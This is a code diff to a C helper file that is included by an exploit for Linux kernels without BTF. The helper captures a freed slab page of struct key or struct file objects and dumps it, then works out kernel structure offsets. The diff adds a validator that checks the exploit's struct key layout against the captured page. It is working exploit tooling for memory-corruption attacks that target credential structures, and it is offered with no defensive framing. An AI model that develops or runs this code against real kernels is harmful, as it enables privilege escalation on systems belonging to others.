@@ -1,13 +1,19 @@
 /* Layout discovery helper for kernels without BTF: dump a captured slab page
-   and print a candidate-offset analysis.  Included by exploit.c.
+   and check the active layout against it.  Included by exploit.c.
 
    K2_DUMP=keys ./exploit     - retired struct key page, distinctive fields
    K2_DUMP=filp ./exploit     - retired struct file page (f_cred)
+
+   After the hexdump the current k2l offsets are validated against the page:
+   every check is a fact we imposed ourselves (uid, perm marker, description
+   bytes, times), so a mismatch means the offsets are wrong and nothing needs
+   a trigger to prove it.
 */
 
 #define K2_DUMP_BYTES 1016U
 #define K2_DUMP_TARGETS (K2_DUMP_BYTES / 8U)
 #define K2_DUMP_MAX_OBJ 8U
+#define K2_DUMP_DESC "kd00001"
 
 static void k2_dump_hex(const char *tag, const unsigned char *page,
                         size_t length)
@@ -42,15 +48,13 @@ static bool k2_time_val(uint64_t v)
     return v >= UINT64_C(1500000000) && v <= UINT64_C(4000000000);
 }
 
-/* Count, over up to K2_DUMP_MAX_OBJ objects, how many carry the field shape
-   described by `kind` at absolute page offset `offset`. */
 enum {
     K2_SHAPE_IMAGE_PAIR_HEAP = 0, /* type, domain_tag, description */
     K2_SHAPE_UID_GID,
     K2_SHAPE_PERM,
     K2_SHAPE_QUOTA_LEN,
-    K2_SHAPE_TIME_PAIR,           /* expiry, last_used_at */
-    K2_SHAPE_HEAP,                /* user, description */
+    K2_SHAPE_TIME_PAIR,
+    K2_SHAPE_HEAP,
 };
 
 static unsigned int k2_count_shape(const unsigned char *page, size_t stride,
@@ -87,7 +91,6 @@ static unsigned int k2_count_shape(const unsigned char *page, size_t stride,
             hits += k2_heap_ptr(get_u64(base + offset));
             break;
         }
-        (void)count;
     }
     return hits;
 }
@@ -117,6 +120,8 @@ static void k2_analyse(const unsigned char *page, size_t length, bool keys)
         if (count < 3)
             continue;
         printf("K2_STRIDE %zu objects=%u\n", stride, count);
+        if (!keys)
+            continue;
         for (size_t offset = 0; offset + 24 <= stride; offset += 8) {
             for (size_t k = 0; k < sizeof(shapes) / sizeof(shapes[0]); k++) {
                 unsigned int hits = k2_count_shape(page, stride, count,
@@ -129,12 +134,44 @@ static void k2_analyse(const unsigned char *page, size_t length, bool keys)
             }
         }
     }
-    (void)keys;
     printf("K2_ANALYSE_END\n");
 }
 
-static int k2_dump_keys(unsigned char *page, unsigned long serial_lo,
-                        unsigned long serial_hi)
+/* Validate the active k2l against the dumped page. */
+static void k2_validate_layout(const unsigned char *page, size_t stride)
+{
+    const unsigned char *object = page;
+    bool pass = true;
+
+    if (!k2l.key_user || !k2l.key_type || !k2l.node_slots) {
+        printf("K2_VALIDATE no layout active\n");
+        return;
+    }
+#define CHECK(cond, label)                                                     \
+    do {                                                                       \
+        printf("K2_VALIDATE %-14s %s\n", label, (cond) ? "ok" : "MISMATCH");   \
+        pass = pass && (cond);                                                 \
+    } while (0)
+    CHECK(k2_image_ptr(get_u64(object + k2l.key_type)), "key.type");
+    CHECK(k2_image_ptr(get_u64(object + k2l.key_domain)), "key.domain_tag");
+    CHECK(k2_heap_ptr(get_u64(object + k2l.key_description)),
+          "key.description");
+    CHECK(k2_heap_ptr(get_u64(object + k2l.key_user)), "key.user");
+    CHECK(get_u32(object + k2l.key_uid) == (uint32_t)getuid(), "key.uid");
+    CHECK(get_u32(object + k2l.key_gid) == (uint32_t)getgid(), "key.gid");
+    CHECK(get_u32(object + k2l.key_perm) == UINT32_C(0x3f3f3f3f), "key.perm");
+    CHECK(get_u16(object + k2l.key_quotalen) == 1, "key.quotalen");
+    CHECK(get_u16(object + k2l.key_desc_len) == 6, "key.desc_len");
+    CHECK(get_u16(object + k2l.key_state) != 0, "key.state");
+    CHECK(k2_time_val(get_u64(object + k2l.key_expiry)), "key.expiry");
+    CHECK(k2_time_val(get_u64(object + k2l.key_last_used)), "key.last_used_at");
+    CHECK(get_u32(object + k2l.key_usage) != UINT32_MAX, "key.usage");
+#undef CHECK
+    printf("K2_VALIDATE_RESULT %s stride=%zu\n", pass ? "PASS" : "FAIL",
+           stride);
+}
+
+static int k2_dump_keys(unsigned char *page)
 {
     enum { DUMP_KEYS = 320 };
     key_serial_t *serials;
@@ -173,10 +210,6 @@ static int k2_dump_keys(unsigned char *page, unsigned long serial_lo,
     }
     printf("K2_DUMP_SERIALS first=%d second=%d last=%d\n", serials[0],
            serials[1], serials[DUMP_KEYS - 1]);
-    if (serial_lo)
-        *(&serial_lo) = (unsigned long)serials[0];
-    if (serial_hi)
-        *(&serial_hi) = (unsigned long)serials[DUMP_KEYS - 1];
     (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
     for (unsigned int i = 0; i < DUMP_KEYS; i++)
         (void)keyctl_raw(KEYCTL_INVALIDATE, (unsigned long)serials[i], 0, 0, 0);
@@ -262,7 +295,7 @@ __attribute__((constructor)) static void k2_dump_constructor(void)
     setvbuf(stdout, NULL, _IONBF, 0);
     memset(page, 0, sizeof(page));
     if (strcmp(what, "keys") == 0)
-        rc = k2_dump_keys(page, 0, 0);
+        rc = k2_dump_keys(page);
     else if (strcmp(what, "filp") == 0)
         rc = k2_dump_filp(page);
     else {
@@ -275,5 +308,12 @@ __attribute__((constructor)) static void k2_dump_constructor(void)
     }
     k2_dump_hex(what, page, sizeof(page));
     k2_analyse(page, sizeof(page), strcmp(what, "keys") == 0);
+    /* Optionally pre-load a layout from env so the validator can run on the
+       very page it is judging. */
+    if (getenv("K2_OFF_KEY_USER")) {
+        (void)k2_layout_probe();
+        (void)k2_layout_finish(0);
+        k2_validate_layout(page, k2l.key_size ? k2l.key_size : 0xd0);
+    }
     _exit(0);
 }
